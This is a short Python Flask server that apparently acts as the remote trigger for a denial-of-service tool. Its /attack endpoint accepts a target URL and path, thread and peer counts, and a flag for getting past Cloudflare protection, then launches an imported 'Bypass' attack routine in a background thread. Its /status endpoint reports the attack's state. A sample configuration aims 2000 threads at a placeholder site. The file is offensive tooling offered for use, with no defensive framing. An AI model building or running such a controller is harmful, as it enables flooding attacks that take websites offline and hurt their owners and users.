#coding:utf-8

from flask import Flask,request
import demjson
import threading
import Bypass
app = Flask(__name__)
json = {'Content-Type': 'application/json'}

@app.route('/')
def hello_world():
    return 'Hello World!'

@app.route('/attack',methods=['POST'])
def attack():
    attackinfo = demjson.decode(request.form['attackinfo'])
    status = Bypass.getstatus()
    if status['Satus'] == 'STOP':
        threading.Thread(target=Bypass.goAttack, args=(attackinfo['T'],attackinfo['url'],attackinfo['path'],attackinfo['charset'],attackinfo['is_protected_by_cf'],attackinfo['threadCount'],attackinfo['peerCount'],attackinfo['keywords'])).start()
        return demjson.encode({'status': 'success'}),json
    else:
        return demjson.encode({'status': 'failed'}),json
@app.route('/status')
def status():
    return demjson.encode(Bypass.getstatus()),json
if __name__ == '__main__':
    print "Json:",demjson.encode({
        'T':8, #Threads
        'url': 'http://www.sample.com',
        'path': '/index.php?id=1',
        'charset': 'utf-8',
        'is_protected_by_cf': True,
        'threadCount': 2000,
        'peerCount': 10,
        'keywords':'php'
    })
    app.run(host='0.0.0.0',port=80)
